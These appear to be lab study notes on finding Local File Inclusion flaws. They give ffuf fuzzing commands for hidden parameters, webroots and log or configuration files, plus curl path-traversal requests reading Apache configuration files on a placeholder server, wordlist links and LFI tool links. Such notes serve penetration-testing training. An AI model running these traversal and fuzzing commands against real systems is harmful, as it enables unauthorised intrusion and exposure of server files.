## Fuzzing Parameters
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
- Find exposed parameters as these are usually not as secure as public ones

## LFI wordlists:
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```


## Fuzzing Server Files
- Server webroot path
- Server configurations file
- Server logs

**Server Webroot
Wordlists:
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```


**Server Logs/Configurations
Wordlists:
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

```
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```


## Automated Tools
- https://github.com/D35m0nd142/LFISuite
- https://github.com/OsandaMalith/LFiFreak
- https://github.com/mzfr/liffy
